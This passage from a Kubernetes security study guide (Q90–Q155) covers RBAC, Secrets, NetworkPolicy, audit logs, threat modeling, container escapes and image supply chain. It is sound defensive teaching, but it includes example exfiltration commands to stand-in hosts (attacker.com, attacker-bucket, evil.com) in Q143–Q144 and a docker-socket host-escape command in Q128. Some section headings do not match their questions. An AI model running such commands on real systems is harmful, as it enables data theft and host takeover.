    Q90: What's the difference between a Role and a ClusterRole?
         A) Role: Namespace-scoped. "In namespace 'anihpj', you can get pods."
            ClusterRole: Cluster-scoped. "In ANY namespace, you can get pods"
            OR "You can get nodes" (nodes aren't namespaced). Use Role for 90%
            of cases. ClusterRole for cross-namespace access or cluster resources.

    Q91: What is the FULL RBAC authorization flow for a kubectl request?
         A) ① kubectl reads kubeconfig → cluster + user + namespace
            ② Sends HTTPS request with credentials
            ③ API server authenticates (validates cert/token → extracts user/group)
            ④ API server iterates ALL RoleBindings (in namespace) + ClusterRoleBindings
            ⑤ Finds matching subject → checks Role/ClusterRole verbs + resources
            ⑥ If ANY matching rule allows the action → ALLOW
            ⑦ If NO matching rule → DENY (default-deny for authorization)

    Q92: How do you bind a Role to a user or ServiceAccount?
         A) RoleBinding (namespace-scoped): binds subjects to a Role in one namespace.
            ClusterRoleBinding (cluster-scoped): binds subjects to a ClusterRole
            across ALL namespaces. Subjects: User (X.509 CN), Group (X.509 O),
            ServiceAccount (system:serviceaccount:<ns>:<name>).

    Q93: What is kubectl auth can-i and why is it useful?
         A) Tests whether an action is allowed WITHOUT performing it:
            kubectl auth can-i create pods --as=alice -n anihpj → yes/no
            kubectl auth can-i --list --as=bob → lists ALL permissions
            The #1 RBAC debugging tool. Test before AND after creating RBAC rules.

    Q94: What are RBAC aggregation rules?
         A) ClusterRoles can aggregate other ClusterRoles using labels:
            rbac.authorization.k8s.io/aggregate-to-view: "true"
            This ClusterRole auto-includes in the built-in "view" ClusterRole.
            CRDs can ship with aggregation labels → users with "view" automatically
            get read access to new custom resources. No manual permission updates.

    Q95: Why is "cluster-admin" dangerous and who should have it?
         A) Full control: all verbs (*) on all resources (*) in all namespaces.
            Can read ALL secrets, impersonate anyone, create privileged pods,
            modify/delete RBAC rules. Only 1-2 cluster administrators. Audit
            ALL uses of cluster-admin.

    Q96: How do you create a "namespace admin" — full access but only in one ns?
         A) kubectl create role team-admin --verb=* --resource=* -n team-anihpj
            kubectl create rolebinding team-admin-binding --role=team-admin \
              --user=team-lead@company.com -n team-anihpj
            * verb + * resource = full access, but Role is namespace-scoped.
            Cannot see or modify resources in other namespaces.

3.5 Secrets (6 Qs)
    Q97: Why is "base64" NOT encryption for Kubernetes Secrets?
         A) Base64 is ENCODING, not encryption. echo "c2VjcmV0MTIz" | base64 -d →
            "secret123". By default Secrets in etcd are base64 — anyone with etcd
            access reads ALL secrets in plaintext. Base64 provides ZERO security.

    Q98: How does EncryptionConfiguration protect Secrets?
         A) Encrypts Secrets BEFORE writing to etcd with AES-CBC, AES-GCM, or KMS.
            etcd stores ciphertext only. On read: API server decrypts before returning.
            Without it: etcd access = total secret compromise.

    Q99: What are the main Secret types and when do you use each?
         A) ① Opaque (default): Arbitrary key-values (DB passwords, API keys)
            ② kubernetes.io/tls: TLS cert + key for Ingress HTTPS
            ③ kubernetes.io/dockerconfigjson: Registry credentials (imagePullSecrets)
            ④ kubernetes.io/service-account-token: Legacy SA tokens (auto-managed)

    Q100: Why is mounting Secrets as volumes MORE secure than envFrom?
         A) Environment variables are visible in /proc/<pid>/environ (world-readable
            inside container!), kubectl describe pod, debug endpoints, crash dumps.
            Volume mounts are isolated to a file path, atomic updates, NOT exposed
            in process listings. Always prefer volumes for secrets.

    Q101: In anihpj/jobpost, what secrets exist and how should they be managed?
         A) Django SECRET_KEY (session signing), PostgreSQL password, Redis password,
            JWT signing key. NONE in Git/Dockerfile/YAML. Store in AWS Secrets
            Manager or HashiCorp Vault via External Secrets Operator. Rotate DB
            passwords every 90 days. Use IRSA instead of static AWS credentials.

    Q102: How do you rotate a Secret without downtime?
         A) ① Create NEW Secret (db-password-v2) → ② Update Deployment to reference
            new Secret → ③ Rolling update → ④ Verify healthy → ⑤ Delete old Secret.
            OR: Use volume mount → K8s auto-updates file (takes ~90s). App must
            watch for file changes (inotify or signal handler).

3.6 Isolation and Segmentation (5 Qs)
    Q103: What are the isolation boundaries in Kubernetes?
         A) ① Namespace isolation: RBAC + NetworkPolicy + ResourceQuota per namespace
            ② Container isolation: Linux namespaces (PID, net, mnt, UTS, IPC, user)
               + cgroups (resource limits) — containers share the host kernel
            ③ Pod isolation: Containers in same pod share network + IPC namespace
            ④ Node isolation: Taints/tolerations, nodeSelectors for dedicated nodes
            ⑤ Strong isolation: gVisor (user-space kernel), Kata Containers (VM-level)

    Q104: What is the difference between PodSecurityContext and Container SecurityContext?
         A) PodSecurityContext applies to ALL containers in pod (runAsUser, fsGroup).
            Container SecurityContext overrides per-container (capabilities,
            readOnlyRootFilesystem, allowPrivilegeEscalation). Pod-level = defaults;
            container-level = exceptions.

    Q105: Why is runAsNonRoot: true important for isolation?
         A) Most images default to USER root (UID 0). If container escapes as root,
            it has ROOT on the node. runAsNonRoot: true forces non-zero UID. If the
            image is configured for root, container FAILS TO START — fail closed.

    Q106: What does capabilities.drop: [ALL] do?
         A) Drops ALL ~40 Linux capabilities. Container process has NO special kernel
            privileges — even as UID 0, can't bind to ports <1024 or change file
            ownership. Add back only what's needed (NET_BIND_SERVICE for web servers).

    Q107: What is the purpose of readOnlyRootFilesystem: true?
         A) Makes container root filesystem READ-ONLY. Attacker can't write malware
            or modify binaries. Catches misconfigured apps. Mount /tmp as emptyDir
            and /var/lib/data as volumes for paths needing writes.

3.7 Audit Logging (5 Qs)
    Q108: What is Kubernetes Audit Logging and why is it critical for security?
         A) Records ALL API server requests: who did what, when, from where, result.
            Essential for: incident investigation, compliance (SOC2/GDPR proof),
            detecting suspicious activity (who read all Secrets at 3 AM?).
            Without audit logs: breach happens, you have NO IDEA what was accessed.

    Q109: What are the audit policy levels and when to use each?
         A) None: Don't log. Metadata: Log who/what/when (not body). Request: Log
            metadata + request body. RequestResponse: Log metadata + request + response
            body (verbose!). Security best practice: Secrets reads at RequestResponse,
            RBAC changes at RequestResponse, pod exec at Metadata, GET pods at None.

    Q110: What should you audit for security monitoring?
         A) Secret reads (who accessed credentials?), RBAC changes (who added admin?),
            pod exec/portforward (who got shell access?), auth failures (brute force?),
            namespace create/delete, NetworkPolicy modifications, PSP/PSS changes.

    Q111: How do you investigate "who deleted the production Deployment"?
         A) Query audit logs: filter by resource=deployments, verb=delete, namespace=
            anihpj, time window. Result shows: user=alice, sourceIP=10.0.1.5,
            userAgent=kubectl/v1.30. Then check: was this authorized? Was it Alice
            or a stolen credential? Correlate with CloudTrail (AWS) or cloud audit.

    Q112: What is the difference between K8s audit logs and cloud audit logs?
         A) K8s audit: What happened INSIDE the cluster (kubectl, API requests).
            Cloud audit (CloudTrail): What happened at CLOUD level (IAM changes,
            who created the EKS cluster, who modified KMS keys). BOTH needed for
            complete visibility. Cloud audit catches IAM policy changes; K8s audit
            catches kubectl commands.

3.8 Network Policy (4 Qs)
    Q113: What problem does a NetworkPolicy solve?
         A) By default, ALL pods can communicate with ALL other pods across ALL
            namespaces. A compromised pod can connect to any database. NetworkPolicy
            creates internal firewall: "web pods can ONLY talk to api pods on port
            8000." Defense-in-depth: restricts lateral movement after compromise.

    Q114: What does a "default-deny all ingress" NetworkPolicy look like?
         A) podSelector: {} (all pods in namespace), policyTypes: [Ingress], no
            ingress rules → ALL incoming traffic DENIED. Then ADD specific policies
            for needed traffic. Zero Trust: deny everything, explicitly allow.

    Q115: What's the difference between podSelector, namespaceSelector, and ipBlock?
         A) podSelector: "Allow traffic to/from pods with label app=api"
            namespaceSelector: "Allow from pods in namespace=frontend"
            ipBlock: "Allow from IP range 10.0.0.0/8 EXCEPT 10.0.1.0/24"
            All three can be combined in a single rule for fine-grained control.

    Q116: For anihpj-db (PostgreSQL), should you set an egress NetworkPolicy?
         A) YES — defense-in-depth. PostgreSQL only needs DNS (UDP 53 to CoreDNS)
            and maybe NTP. DEFINITELY NOT internet. With restrictive egress, even
            if attacker gets code execution via SQL injection, they can't exfiltrate
            data to an external server. Data is "trapped" inside the cluster.

4.1 Kubernetes Trust Boundaries and Data Flow (5 Qs)
    Q117: What is the MITRE ATT&CK framework?
         A) A globally-accessible knowledge base of adversary tactics and techniques
            based on real-world observations. For Kubernetes, it maps specific attack
            techniques to the container lifecycle:
            • Initial Access: Compromised image, exposed dashboard, cloud credential theft
            • Execution: Exec into container, deploy malicious pod, sidecar injection
            • Persistence: Backdoor ServiceAccount, writable hostPath, cron job
            • Privilege Escalation: Container escape, privileged pod, host mount
            • Defense Evasion: Clear logs, disable audit, delete Falco rules
            • Credential Access: Read mounted Secrets, steal SA tokens, list etcd
            • Discovery: List pods/namespaces, check cloud metadata API
            • Lateral Movement: Use stolen SA token to access other pods
            • Collection: Access database from compromised API pod
            • Exfiltration: DNS tunneling, HTTPS to C2 server, copy data to external storage
            • Impact: Delete data, cryptomining, resource hijacking

    Q118: What is threat modeling and why is it important?
         A) Threat modeling is the process of identifying WHAT you're protecting,
            WHO might attack it, HOW they would attack, and WHAT you'll do about it.
            Key questions:
            • What are our crown jewels? (anihpj: user PII, financial data, source code)
            • Who would want them? (competitors, criminals, nation-states, insiders)
            • How would they get them? (SQL injection → DB access, compromised image → pod)
            • What damage could they cause? (data breach, service outage, ransomware)
            • What controls do we have? (NetworkPolicy, RBAC, encryption, audit logs)
            KCSA expects you to understand the PROCESS, not create formal STRIDE/DREAD models.

    Q119: Using the MITRE ATT&CK framework, trace a potential attack on anihpj/jobpost
          from initial access to data exfiltration.
         A) Kill chain for anihpj/jobpost:
            ① Initial Access: Attacker uploads malicious image to Docker Hub with tag
               "anihpj-api:latest", tricking a developer into using it (typosquatting).
            ② Execution: The malicious image starts a reverse shell alongside gunicorn,
               connecting to the attacker's C2 server.
            ③ Discovery: Attacker checks mounted ServiceAccount token: curl -k https://
               kubernetes.default.svc/api/v1/namespaces/anihpj/pods → lists all pods.
            ④ Lateral Movement: Attacker discovers anihpj-db pod. From api pod, connects
               to anihpj-db:5432 using credentials from env vars. Dumps all user data.
            ⑤ Exfiltration: Attacker chunks the data and sends it via DNS queries to
               attacker-controlled nameserver (DNS tunneling — bypasses egress filtering
               that only checks ports). Data is now stolen.
            Defense at each step:
            ① Image signing (Cosign) + allowed registries (OPA) → block malicious image
            ② Falco: detect unexpected outbound connection → alert + kill pod
            ③ RBAC: api SA has no Kubernetes API access → discovery fails
            ④ NetworkPolicy: api→db allowed, but DB credentials in external vault
            ⑤ Egress NetworkPolicy: only allow DNS to CoreDNS → DNS tunneling blocked

    Q120: What is STRIDE threat modeling?
         A) STRIDE categorizes threats into 6 types (Microsoft's model):
            • Spoofing: Pretending to be someone else (stolen kubeconfig, forged JWT)
            • Tampering: Modifying data or code (malicious image, ConfigMap injection)
            • Repudiation: Denying an action (deleting audit logs, disabling Falco)
            • Information Disclosure: Leaking data (reading Secrets, etcd dump)
            • Denial of Service: Making service unavailable (resource exhaustion, pod deletion)
            • Elevation of Privilege: Gaining higher access (privileged pod, RBAC escalation)
            For Kubernetes: map each STRIDE category to specific Kubernetes controls.

    Q121: What are the "crown jewels" in anihpj/jobpost?
         A) ① User PII in PostgreSQL: names, emails, resumes, phone numbers
            ② Django SECRET_KEY: can forge sessions, reset passwords, sign CSRF tokens
            ③ API authentication tokens: JWT secrets, OAuth client secrets
            ④ Payment/Financial data: if jobpost processes payments (PCI-DSS scope)
            ⑤ Source code (GitHub): intellectual property, reveals vulnerabilities
            ⑥ CI/CD pipeline credentials: can modify production deployments
            Prioritize protecting these based on impact of compromise. PII leak = GDPR
            fines. SECRET_KEY leak = complete application compromise.

    Q122: How do you model threats SPECIFIC to a managed Kubernetes service (EKS/AKS/GKE)?
         A) Additional cloud-specific threats:
            • IAM role chaining: Pod → IRSA → IAM Role → cross-account access
            • Cloud metadata endpoint: 169.254.169.254 exposes node IAM credentials
            • Cloud API access: compromised pod calls AWS/GCP/Azure APIs with node creds
            • Managed control plane: provider has etcd access → encryption at KMS level
            • Cloud audit logs: separate from K8s audit logs (CloudTrail + K8s audit = full picture)
            KCSA: understand the SHARED model — some threats are mitigated by the provider
            (control plane security), but YOU own workload/network/data security.

    Q123: What is the difference between a "threat" and a "vulnerability"?
         A) Vulnerability: A WEAKNESS in the system (e.g., runAsUser: 0, no NetworkPolicy,
            Secrets in plaintext). It's a property of YOUR configuration.
            Threat: A POTENTIAL ATTACK that exploits a vulnerability (e.g., an attacker
            exploiting the root user to escape the container). It's external.
            Risk = Vulnerability × Threat × Impact. You can reduce risk by:
            • Fixing vulnerabilities (securityContext, NetworkPolicy, encryption)
            • Reducing threat likelihood (IP whitelisting, WAF, auth)
            • Limiting impact (least privilege RBAC, backup/restore, blast radius)

    Q124: What is the "assume breach" mentality?
         A) Assume an attacker IS already inside your cluster. Now what?
            • Detect them: Falco alerts on anomalous behavior
            • Contain them: NetworkPolicy limits lateral movement
            • Slow them: RBAC prevents privilege escalation
            • Alert on them: Audit logs show who accessed what
            • Recover: etcd backups allow full cluster state recovery
            "Assume breach" means designing security controls that work even when
            perimeter defenses fail. It's the opposite of "we have a firewall, we're safe."

4.2 Persistence (4 Qs)
    Q125: What is a "container escape"?
         A) When a process inside a container breaks out and gains access to the
            HOST operating system. The container's isolation (namespaces, cgroups)
            is breached. Once on the host, the attacker can:
            • Access other containers' filesystems (via /var/lib/docker or /proc)
            • Install kernel modules, malware, or backdoors
            • Steal node-level credentials (kubelet certs, cloud metadata)
            • Attack other nodes from this compromised node
            Container escape is the WORST-CASE scenario in Kubernetes security.

    Q126: What are the most common container escape techniques?
         A) ① Privileged container: --privileged flag gives ALL capabilities + access
               to ALL host devices. Trivial escape: mount host / as a volume.
            ② Mounting Docker socket: volume mount /var/run/docker.sock → container
               can launch NEW privileged containers on the host (Docker-in-Docker attack).
            ③ hostPath mount of / (root filesystem): chroot into host filesystem.
            ④ CAP_SYS_ADMIN capability: Allows mount, pivot_root, and other dangerous
               syscalls. Many escapes use CAP_SYS_ADMIN.
            ⑤ Kernel exploits (Dirty Cow, Dirty Pipe): Vulnerabilities in the shared
               kernel that containers can exploit to gain root on the host.
            ⑥ /proc or /sys mounted without proper permissions: Can modify kernel
               parameters from inside the container.

    Q127: How do you prevent container escapes?
         A) ① NEVER use --privileged (unless absolutely necessary — and even then, NO)
            ② Drop ALL capabilities, add back only needed ones
            ③ Set allowPrivilegeEscalation: false
            ④ Use readOnlyRootFilesystem: true
            ⑤ NEVER mount Docker socket (/var/run/docker.sock) into containers
            ⑥ NEVER mount host root filesystem (/) via hostPath
            ⑦ Use seccomp (RuntimeDefault at minimum)
            ⑧ Use AppArmor/SELinux profiles
            ⑨ Run as non-root (runAsNonRoot: true)
            ⑩ Use sandboxed runtimes: gVisor (user-space kernel) or Kata Containers
               (lightweight VM) — even if container escapes, it's TRAPPED in a VM!

    Q128: What is the "Docker socket attack" and why is it dangerous?
         A) If /var/run/docker.sock is mounted into a container, the container can
            control the host's Docker daemon. Attack:
            docker run -d --privileged --net=host -v /:/host alpine chroot /host
            This launches a PRIVILEGED container on the HOST with the host's root
            filesystem mounted. The attacker now has FULL ROOT on the host machine.
            Prevention: NEVER mount docker.sock. Use Kaniko, BuildKit, or img for
            container image building in CI/CD instead of Docker-in-Docker.

    Q129: What's the difference between gVisor, Kata Containers, and Firecracker?
         A) All three are SANDBOXED runtimes that add an extra isolation layer:
            gVisor: User-space kernel (Sentry) written in Go. Intercepts syscalls
                    from the container and handles them in userspace — only ~200 syscalls
                    are passed to the real kernel. Lightweight, fast startup.
            Kata Containers: Runs each pod in a dedicated lightweight VM (using QEMU
                    or Firecracker). Each pod gets its OWN kernel — strongest isolation.
            Firecracker: AWS's microVM (used by Lambda and Fargate). Extremely fast
                    boot (125ms), minimal device model. Used by Kata as a VMM option.
            Choose based on: gVisor = fast, good enough for most workloads. Kata =
            strongest isolation (VM-level), higher overhead. Use RuntimeClass to
            assign different runtimes per pod.

    Q130: In a multi-tenant Kubernetes cluster, why should untrusted tenants'
          pods use a sandboxed runtime?
         A) "Untrusted" = users who can run arbitrary code in pods (customers, external
            developers, CI/CD from third-party repos). If their pod escapes:
            • Without sandbox: attacker gains HOST root access → can compromise ALL
              other tenants' pods on that node.
            • With gVisor/Kata: attacker is trapped in a sandbox → escape targets
              the sandbox, not the real host kernel → much harder to escape.
            Multi-tenancy without sandboxing = one compromised tenant can breach
            ALL tenants. Sandboxing limits blast radius to one tenant.

    Q131: What is a "privileged pod" and why is it the nuclear option?
         A) A pod with securityContext: privileged: true gets:
            • ALL Linux capabilities (not just the default set)
            • Access to ALL host devices (/dev/*)
            • Disabled seccomp, AppArmor, and SELinux restrictions
            • Ability to modify kernel parameters (sysctl)
            Essentially: the pod IS root on the host with no restrictions.
            Only system components (CNI plugins, CSI drivers, kube-proxy) should
            EVER run as privileged — and even then, explore alternatives first.

    Q132: What is the CAP_SYS_ADMIN capability and why is it so dangerous?
         A) CAP_SYS_ADMIN is called the "new root" — it's a catch-all capability that
            allows: mount/unmount filesystems, swapon/swapoff, sethostname, setdomainname,
            pivot_root, namespaces creation, and many more (~50 privileged operations).
            In a container, CAP_SYS_ADMIN alone (without --privileged) is enough for
            most container escape techniques. NEVER give CAP_SYS_ADMIN to application
            containers. If a workload needs it, ask WHY and find an alternative.

4.3 Denial of Service (5 Qs)
    Q133: What is a supply chain attack in the context of containers?
         A) An attack that compromises your software BEFORE it reaches the cluster.
            Attack vectors:
            • Malicious base image: Attacker publishes "ubuntu:latest" image with
              a backdoor on Docker Hub (typosquatting or account takeover).
            • Poisoned dependencies: npm/pip package with hidden malware (e.g.,
              event-stream incident — attacker gained publish rights to a popular
              npm package and added crypto-stealing code).
            • Compromised build server: Attacker modifies CI/CD pipeline to inject
              malicious code during build (e.g., SolarWinds attack).
            • Tampered registry: Attacker replaces a legitimate image in a registry
              with a backdoored version.
            • Stolen signing keys: Attacker signs malicious images with legitimate keys.

    Q134: How does image signing (Cosign/Sigstore) prevent supply chain attacks?
         A) ① Developer builds image → Cosign signs it with their OIDC identity
               (e.g., alice@company.com via GitHub SSO — KEYLESS signing!).
            ② Signature stored in the registry alongside the image.
            ③ Rekor transparency log records the signature (public, immutable —
               tampering is detectable).
            ④ Before deployment: admission controller checks Cosign signature →
               verifies it matches a trusted identity in Rekor log.
            ⑤ If signature missing or invalid → image REJECTED.
            This ensures: "This image was built by alice@company.com from commit
            abc123 at timestamp T" — verifiable chain of custody.

    Q135: What is "keyless signing" with Cosign and why is it better?
         A) Traditional signing: Generate a private key → store it securely → use it
            to sign → protect the key FOREVER. If key is stolen → all signatures
            compromised. Key management is HARD.
            Keyless signing: Use OIDC (OpenID Connect) to prove your identity to
            Fulcio (Sigstore's certificate authority). Fulcio issues a SHORT-LIVED
            certificate (10 minutes!) tied to your identity. You sign with this
            temporary cert. No long-lived keys to manage or steal. The Rekor
            transparency log provides proof of when and by whom the signature happened.

    Q136: How do you prevent pulling images from untrusted registries?
         A) ① OPA/Gatekeeper or Kyverno policy: validate that all image references
               match allowed registries (e.g., "*.ecr.aws.amazon.com", "anihpj.io/*").
            ② ImagePolicyWebhook admission controller: The BUILT-IN way — API server
               calls an external webhook for every image reference. Rejects if not
               in allowed list. (Less flexible than OPA/Kyverno).
            ③ NetworkPolicy egress: Restrict pods from reaching unapproved registries.
               Only allow egress to your private registry (defense-in-depth).

    Q137: What is the difference between Trivy and Grype for image scanning?
         A) Both are open-source vulnerability scanners for container images:
            Trivy (Aqua Security): Scans OS packages + language-specific dependencies
            (pip, npm, gem, etc.). Extremely fast, easy to integrate into CI/CD.
            Grype (Anchore): Also scans OS + language packages. Part of the Syft
            (SBOM) + Grype (scan) ecosystem. Often paired: Syft generates SBOM →
            Grype scans for CVEs against the SBOM.
            For KCSA: Understand WHAT image scanning does, not tool-specific flags.
            Image scanning finds KNOWN CVEs — it does NOT find custom backdoors
            or zero-days. Combine scanning with signing for defense-in-depth.

    Q138: What is an SBOM (Software Bill of Materials) and what standard formats exist?
         A) SBOM = a machine-readable inventory of every component in your software:
            packages, libraries, versions, licenses, and their dependencies.
            Formats: SPDX (Linux Foundation standard), CycloneDX (OWASP standard),
            Syft JSON (Anchore format — can convert to SPDX/CycloneDX).
            Tools: Syft (generate from container image), Trivy (generate + scan),
            Tern (inspect container layers).
            Example: If Log4Shell (CVE-2021-44228) is announced, query your SBOM
            database: "Which images contain log4j-core ≤ 2.14.1?" → instant answer
            vs "check every image manually for 2 weeks."

    Q139: What are SLSA levels and what do they mean?
         A) SLSA (Supply Chain Levels for Software Artifacts) — pronounced "salsa":
            Level 0: No guarantees. Source and build are untrusted.
            Level 1: Build is SCRIPTED (automated, not manual). Provenance shows
                    source repo + build command.
            Level 2: Build is VERSIONED + uses a HOSTED build service. Build
                    service generates provenance with signatures.
            Level 3: Source and build platforms meet AUDITABILITY standards.
                    Builds are ISOLATED (no shared build machines). "Non-falsifiable"
                    provenance — you can't fake who built what.
            Level 4: Requires TWO-PERSON REVIEW of all changes + HERMETIC builds
                    (all dependencies declared, no network access during build).
            Most organizations target SLSA Level 2-3. Level 4 is for critical
            infrastructure (e.g., government, financial systems).

    Q140: For anihpj/jobpost, what's a practical supply chain security strategy?
         A) ① Pin base images by SHA256 digest (NOT tags):
               FROM python:3.12-slim@sha256:abc123def456...
               Tags are mutable (:latest changes tomorrow — same tag, different image)
            ② Multi-stage build: build in stage 1, copy only runtime artifacts to
               distroless stage 2 (no shell, no package manager — smaller attack surface)
            ③ CI/CD pipeline: Trivy scan → fail on CRITICAL/HIGH CVEs → Cosign sign
               (keyless with dev's OIDC) → push to private registry → SBOM upload
            ④ Deploy: Admission controller verifies Cosign signature + registry
               is in allowed list → deploy
            ⑤ Runtime: Falco monitors for unexpected behavior (new processes,
               outbound connections, file writes)

4.4 Malicious Code Execution and Compromised Applications in Containers (6 Qs)
    Q141: What is "lateral movement" in a Kubernetes cluster?
         A) When an attacker, having compromised ONE pod, uses that foothold to access
            OTHER resources in the cluster. Example:
            Compromise anihpj-web → use its ServiceAccount token to list all pods →
            discover anihpj-db → connect to PostgreSQL on port 5432 → dump all user data.
            NetworkPolicy + RBAC are your PRIMARY lateral movement defenses. If anihpj-web
            can't talk to anihpj-db (NetworkPolicy blocks it) AND can't list pods
            (RBAC blocks it), the attacker is STUCK in the web pod — blast radius limited.

    Q142: How can an attacker use a compromised ServiceAccount token?
         A) The token at /var/run/secrets/kubernetes.io/serviceaccount/token allows the
            attacker to authenticate to the Kubernetes API. What they can DO depends on
            RBAC. If the SA has cluster-admin: GAME OVER — create privileged pods, read
            all secrets, delete everything. If the SA has minimal RBAC (e.g., only
            get pods in one namespace): attacker can only see pod names — limited damage.
            This is why least privilege RBAC per SA is CRITICAL. Every SA should have
            ONLY the permissions its pod needs, and NOTHING more.

    Q143: What methods can an attacker use to exfiltrate data from a compromised pod?
         A) ① HTTPS to external server: curl -X POST https://attacker.com/upload -d @data
               → Block with egress NetworkPolicy (allow only approved destinations)
            ② DNS tunneling: Encode data in DNS queries: base64-encode data → chunk →
               send as subdomain of attacker-controlled domain → attacker's DNS server
               reassembles. Example: chunk1.attacker.com, chunk2.attacker.com...
               → Hard to block at L3/L4 (DNS is usually allowed). Need L7 DNS inspection.
            ③ Cloud storage: aws s3 cp data.txt s3://attacker-bucket/ (if pod has IAM creds)
               → Prevent with restrictive IAM roles + NetworkPolicy.
            ④ Steganography in logs: Embed data in log messages picked up by log aggregator
               → Monitor for unusual log patterns, size anomalies.

    Q144: What is DNS tunneling and why is it hard to detect?
         A) DNS tunneling encodes data in DNS queries. DNS is almost ALWAYS allowed
            (pods need DNS to function). Architecture: Attacker controls a domain
            (evil.com) and its nameserver. Pod makes DNS query for base64-encoded-
            data.evil.com → CoreDNS forwards to upstream DNS → reaches attacker's
            nameserver → attacker reassembles data from DNS query logs.
            Defense: DNS-layer inspection (Cilium L7 policies can inspect DNS queries),
            CoreDNS logging, DNS query size monitoring (tunneled queries are unusually
            large), and egress NetworkPolicy that only allows DNS to CoreDNS (not
            external DNS servers directly).

    Q145: What is a cryptojacking attack in Kubernetes?
         A) Attacker deploys cryptocurrency miners inside your cluster, using YOUR
            compute resources (CPU/GPU) to mine cryptocurrency for THEM. You pay the
            AWS bill; they get the crypto. Detection:
            • Sudden sustained high CPU usage (kubectl top pod)
            • Unexpected processes in containers (Falco: "process other than gunicorn
              started in anihpj-api pod")
            • Unusual outbound connections to mining pool IPs
            • Cloud bill anomaly (GPU instances running 24/7 at 100%)
            Tesla was famously cryptojacked in 2018 via an unsecured Kubernetes dashboard.

    Q146: What are Denial-of-Service (DoS) risks in Kubernetes?
         A) ① Resource exhaustion: Pod without resource limits uses all node CPU/memory
               → other pods starved → node OOMKiller evicts pods. Fix: ALWAYS set
               resource requests + limits.
            ② etcd overload: Too many writes (e.g., 1000 pods rapidly creating/deleting)
               → etcd latency spikes → API server slow → cluster unusable. Fix: rate
               limiting, API priority and fairness.
            ③ API server DoS: Flood of unauthenticated requests to port 6443. Fix:
               --max-requests-inflight, network firewall, WAF.
            ④ DNS DoS: Flood of DNS queries to CoreDNS → DNS resolution fails → services
               unreachable. Fix: CoreDNS autoscaling, DNS caching (NodeLocal DNSCache).
            ⑤ Disk exhaustion: Container logs fill up node disk → kubelet can't write →
               node NotReady. Fix: log rotation, disk monitoring, separate log partition.

    Q147: What should you do if you DETECT a security breach in your cluster?
         A) Incident Response for Kubernetes (FIRST 5 MINUTES):
            ① ISOLATE: Cordon the affected node → no new pods scheduled.
            ② CONTAIN: Apply emergency NetworkPolicy blocking all egress from
               affected namespace (prevent data exfiltration).
            ③ PRESERVE EVIDENCE: Take etcd snapshot immediately (preserves state
               for forensics). Download pod logs, audit logs, Falco events.
            ④ IDENTIFY: What was accessed? Which SA tokens were compromised?
               Check audit logs for actions by the compromised identity.
            ⑤ REVOKE: Delete compromised SA tokens, rotate all Secrets in affected
               namespace, revoke cloud IAM credentials.
            ⑥ RESTORE: Restore from known-good backup. Verify no backdoors remain.
            ⑦ POST-MORTEM: How did they get in? What controls failed? Improve.
            KCSA: Know the PROCESS, not specific tools. Contain first, investigate later.

    Q148: What is the "blast radius" concept and how do you minimize it?
         A) Blast radius = the amount of damage a single compromise can cause.
            Minimize by:
            • Namespace isolation: Each app in its own namespace → compromise of
              app-A namespace doesn't affect app-B (separate RBAC, NetworkPolicy, quotas)
            • Least privilege RBAC: anihpj-api SA can only access anihpj namespace,
              NOT kube-system or other tenants.
            • NetworkPolicy: anihpj-api can ONLY talk to anihpj-db:5432 and anihpj-redis:6379
              → can't attack other databases or services.
            • Pod Security: readOnlyRootFilesystem prevents writing malware, drop ALL
              capabilities prevents kernel exploits.
            • Dedicated ServiceAccounts per workload: compromise of api SA doesn't
              give access to db SA's permissions.
            Goal: If one pod is compromised, the attacker should be TRAPPED in that
            pod with minimal ability to cause harm beyond that pod.

5.1 Supply Chain Security (6 Qs)
    Q149: Why does a smaller base image improve security?
         A) Fewer packages = fewer CVEs = smaller attack surface. Example:
            • ubuntu:latest: ~77MB, ~200+ packages → ~100+ potential CVEs
            • alpine:latest: ~5MB, ~30 packages → ~10 potential CVEs
            • distroless (gcr.io/distroless/python3): ~50MB, ~10 packages → ~3 CVEs
            • scratch (FROM scratch): 0MB, 0 packages, 0 CVEs (but also 0 tools!)
            The math is simple: every installed package is a potential vulnerability.
            Remove everything your app doesn't need. If you don't need curl, vim,
            bash, apt — don't include them.

    Q150: What is a "distroless" image and why should you use it?
         A) Google's distroless images contain ONLY your application and its runtime
            dependencies. NO shell, NO package manager, NO utilities. If an attacker
            gets code execution, they can't:
            • apt-get install malware (no package manager)
            • bash to explore the filesystem (no shell)
            • curl/wget to download tools (not installed)
            • Find SUID binaries to exploit (none included)
            This frustrates attackers — they have code execution but no TOOLS to
            leverage it. Distroless + readOnlyRootFilesystem = attacker can't install
            or write ANYTHING.

    Q151: What is a multi-stage Docker build and how does it improve security?
         A) Stage 1 (BUILDER): Full development image with compilers, dev dependencies,
            build tools. Build the application binary here.
            Stage 2 (RUNTIME): Minimal image (distroless or scratch). Copy ONLY the
            compiled binary from Stage 1. No compilers, no dev tools, no source code.
            Benefits: Build tools (gcc, make, git) never appear in production image →
            attacker can't use them. Also reduces image size dramatically (1GB → 50MB).

    Q152: In the anihpj/jobpost Dockerfile, what are the key security practices?
         A) ① FROM python:3.12-slim@sha256:abc... (PIN digest, not tag)
            ② Multi-stage: builder stage (compile dependencies) → runtime stage
               (gcr.io/distroless/python3-debian12:nonroot)
            ③ USER 1000:1000 (non-root user — created in distroless base)
            ④ COPY . . done AFTER dependency installation (layer caching + no source
               code changes invalidate dependency cache)
            ⑤ NEVER COPY .env or secrets — use BuildKit secret mounts:
               RUN --mount=type=secret,id=django-secret-key \
                   export SECRET_KEY=$(cat /run/secrets/django-secret-key) && ...
            ⑥ .dockerignore: exclude .git/, *.pyc, __pycache__, .env, venv/, *.log

    Q153: What is the difference between COPY and ADD in a Dockerfile?
         A) COPY: Simple file copy from build context to image. USE THIS.
            ADD: COPY + extras:
            • If source is a URL: DOWNLOADS the file (security risk: MITM, compromised URL)
            • If source is a tar archive: AUTO-EXTRACTS it (risk: tar bomb, path traversal)
            ADD's extra features are security risks. Always use COPY unless you specifically
            need tar auto-extraction. Even then, prefer RUN curl ... | tar ... for
            transparency.

    Q154: How do you ensure no secrets leak into Docker image layers?
         A) Problem: Each RUN command creates a new layer. If you COPY a secret, then
            RUN rm secret.txt — the secret STILL EXISTS in the earlier layer!
            Solutions:
            • BuildKit secrets: RUN --mount=type=secret,id=mysecret command
              (secret is mounted temporarily, NOT stored in any layer)
            • .dockerignore: add .env, *.pem, credentials.json
            • Multi-stage builds: secrets used in builder stage → only binary
              copied to runtime stage → secrets never reach final image
            • docker history <image> — check what's in your layers (if you see
              secrets here, they're baked in FOREVER)

    Q155: Why should you use COPY requirements.txt BEFORE COPY .?
         A) Docker caches each layer. If you COPY . first:
